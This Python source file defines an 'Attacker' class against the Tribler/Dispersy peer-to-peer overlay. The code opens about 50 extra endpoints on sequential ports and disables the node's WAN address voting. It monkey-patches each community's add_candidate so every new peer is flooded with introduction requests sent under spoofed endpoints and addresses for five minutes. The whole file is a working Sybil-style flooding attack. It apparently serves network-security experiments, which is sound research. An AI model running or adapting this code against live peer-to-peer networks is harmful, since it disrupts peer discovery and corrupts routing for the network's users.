import sys
from Tribler.dispersy.endpoint import StandaloneEndpoint
from Tribler.dispersy.candidate import BootstrapCandidate

class Attacker:

    def __init__(self, dispersy, nr_endpoints=50, nr_candidates=100):
        self.dispersy = dispersy
        self.nr_endpoints = nr_endpoints
        self.nr_candidates = nr_candidates

        # step 1, start creating some endpoints
        self.endpoints = []
        self.connect()

        # step 2, replace wan_address_vote method
        dispersy.wan_address_vote = lambda address, voter: None

        # step 3, wrap add_candidate method for current communities
        def add_candidate(community, candidate):
            if not isinstance(candidate, BootstrapCandidate):
                if candidate.sock_addr not in community._candidates:
                    community.old_add_candidate(candidate)

                    if self.nr_candidates:
                        dispersy.callback.register(self.send_requests, (community, candidate))
                        self.nr_candidates -= 1

        for community in dispersy.get_communities():
            community.old_add_candidate = community.add_candidate
            community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)

        # step 4, schedule disconnect
        dispersy.callback.register(self.disconnect, delay=300.0)

    def send_requests(self, community, candidate):
        while not self.disconnected:
            for lan_port, endpoint in self.endpoints:
                cur_endpoint = community.dispersy._endpoint
                cur_lanport = community.dispersy._lan_address[1]
                cur_wanport = community.dispersy._wan_address[1]

                community.dispersy._endpoint = endpoint
                community.dispersy._lan_address = (community.dispersy._lan_address[0], lan_port)
                community.dispersy._wan_address = (community.dispersy._wan_address[0], lan_port)

                community.create_introduction_request(candidate, False)

                community.dispersy._endpoint = cur_endpoint
                community.dispersy._lan_address = (community.dispersy._lan_address[0], cur_lanport)
                community.dispersy._wan_address = (community.dispersy._wan_address[0], cur_wanport)

                yield 2.5

                if self.disconnected:
                    break

    def connect(self):
        while len(self.endpoints) < self.nr_endpoints:
            prevport = self.endpoints[-1][0] if len(self.endpoints) else self.dispersy.lan_address[1] + 1000
            endpoint = StandaloneEndpoint(prevport + 1)
            endpoint.open(self.dispersy)

            self.endpoints.append((endpoint._port, endpoint))

        self.disconnected = False

    def disconnect(self):
        self.disconnected = True

        for _, endpoint in self.endpoints:
            endpoint.close()

